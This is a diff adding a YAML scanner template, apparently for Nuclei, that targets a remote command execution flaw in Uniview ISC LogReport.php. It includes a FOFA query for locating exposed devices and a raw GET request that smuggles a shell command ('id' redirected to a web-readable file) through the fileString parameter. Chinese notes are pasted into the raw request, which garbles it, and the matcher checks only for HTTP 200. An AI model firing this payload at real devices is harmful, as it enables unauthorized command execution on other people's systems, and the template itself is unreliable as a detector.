@@ -1,0 +1,34 @@
+id: poc-gkpsk8if4dpx00kc
+info:
+  name: 浙江宇视科技 ISC LogReport.php 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkpsk8if4dpx00kc'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gkpsk8if4dpx00kc
+    fofa: title=="ISC5000-E"
+http:
+- raw:
+  - 'GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3edudesuite.txt HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /Interface/LogReport/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
